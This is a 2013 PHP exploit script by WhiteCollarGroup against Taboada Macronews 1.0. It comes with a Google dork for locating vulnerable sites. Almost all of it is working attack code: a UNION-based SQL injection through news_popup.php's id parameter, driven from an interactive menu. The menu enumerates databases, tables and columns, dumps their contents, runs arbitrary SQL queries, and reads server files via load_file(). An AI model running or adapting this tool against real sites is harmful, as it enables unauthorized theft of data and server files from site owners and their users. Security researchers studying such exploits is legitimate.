<?php
/*
# Exploit Title: Taboada Macronews <= 1.0 SQLi Exploit
# Date: 03rd January 2013
# Exploit Author: WhiteCollarGroup
# Software Link: http://www.scriptbrasil.com.br/download/codigo/7144/
# Version: 1.0
# Google Dork: intext:"Powered by: joaotaboada.com"

Usage:
    php filename.php
*/

function puts($str) {
    echo $str."\n";
}
 
function gets() {
    return trim(fgets(STDIN));
}
  
function hex($string){
    $hex=''; // PHP 'Dim' =]
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return '0x'.$hex;
}
 
$token = uniqid();
$token_hex = hex($token);
 
puts("Taboada Macronews <= 1.0 SQL Injection Exploit");
puts("By WhiteCollarGroup (0KaL miss all of you guys)");
 
puts("[?] Enter website URL (e. g.: http://www.target.com/taboada/):");
$target = gets();
 
puts("[*] Checking...");
if(!@file_get_contents($target)) die("[!] Access error: check domain and path.");
 puts("[.] Connected.");
if(substr($target, (strlen($target)-1))!="/") $target .= "/";
 
function runquery($query) {
    global $target,$token,$token_hex;
     
    $query = preg_replace("/;$/", null, $query);
     
    $query = urlencode($query);
    $rodar = $target . "news_popup.php?id='%20UNION%20ALL%20SELECT%201,2,3,concat($token_hex,%28$query%29,$token_hex),5,6,7,8--%20";
//    die($rodar);
    $get = file_get_contents($rodar);
    $matches = array();
    preg_match_all("/$token(.*)$token/", $get, $matches);
    if(isset($matches[1][0]))
        return $matches[1][0];
    else
        return false;
}
 
if(runquery("SELECT $token_hex")!=$token) {
    puts("[!] Couldn't get data");
    exit;
}

puts("[i] MySQL version is ".runquery("SELECT version()"));
puts("[i] MySQL user is ".runquery("SELECT user()"));
 
function main($msg=null) {
    global $token,$token_hex;
     
    echo "\n".$msg."\n";
    puts("[>] MAIN MENU");
    puts("[1] Browse MySQL");
    puts("[2] Run SQL Query");
    puts("[3] Read file");
    puts("[4] About");
    puts("[0] Exit");
    $resp = gets();
 
    if($resp=="0")
        exit;
    elseif($resp=="1") {
         
        // pega dbs
        $i = 0;
        puts("[.] Getting databases:");
        while(true) {
            $pega = runquery("SELECT schema_name FROM information_schema.schemata LIMIT $i,1");
            if($pega)
                puts(" - ".$pega);
            else
                break;
                 
            $i++;
        }
         
        puts("[!] Current database: ".runquery("SELECT database()"));
        puts("[?] Enter database name for select:");
        $own = array();
        $own['db'] = gets();
        $own['dbh'] = hex($own['db']);
         
        // pega tables da db
        $i = 0;
        puts("[.] Getting tables from $own[db]:");
        while(true) {
            $pega = runquery("SELECT table_name FROM information_schema.tables WHERE table_schema=$own[dbh] LIMIT $i,1");
            if($pega)
                puts(" - ".$pega);
            else
                break;
                 
            $i++;
        }
        puts("[?] Enter table name for select:");
        $own['tb'] = gets();
        $own['tbh'] = hex($own['tb']);
         
        // pega colunas da table
        $i = 0;
        puts("[.] Getting columns from $own[db].$own[tb]:");
        while(true) {
            $pega = runquery("SELECT column_name FROM information_schema.columns WHERE table_schema=$own[dbh] AND table_name=$own[tbh] LIMIT $i,1");
            if($pega)
                puts(" - ".$pega);
            else
                break;
                 
            $i++;
        }
        puts("[?] Enter columns name, separated by commas (\",\") for select:");
        $own['cl'] = explode(",", gets());
         
        // pega dados das colunas
         
        foreach($own['cl'] as $coluna) {
            $i = 0;
            puts("[=] Column: $coluna");
            while(true) {
                $pega = runquery("SELECT $coluna FROM $own[db].$own[tb] LIMIT $i,1");
                if($pega) {
                    puts(" - $pega");
                    $i++;
                } else
                    break;
            }
             
            echo "\n[ ] -+-\n";
        }
         
        main();
         
    } elseif($resp=="2") {
        puts("[~] RUN SQL QUERY");
        puts("[!] You can run a SQL code. It can returns a one-line and one-column content. You can also use concat() or group_concat().");
        puts("[?] Query (enter for exit): ");
        $query = gets();
        if(!$query) main();
        else main(runquery($query."\n"));
    } elseif($resp=="3") {
        puts("[?] File path (may not have priv):");
        $file = hex(gets());
        $le = runquery("SELECT load_file($file) AS wc");
        if($le)
            main($le);
        else
            main("File not found, empty or no priv!");
             
    } elseif($resp=="4") {
        puts("Coded by 0KaL @ WhiteCollarGroup");
        puts("tinyurl.com/WCollarGroup");
        main();
    }
    else
        main("[!] Wrong choice.");
}
 
main();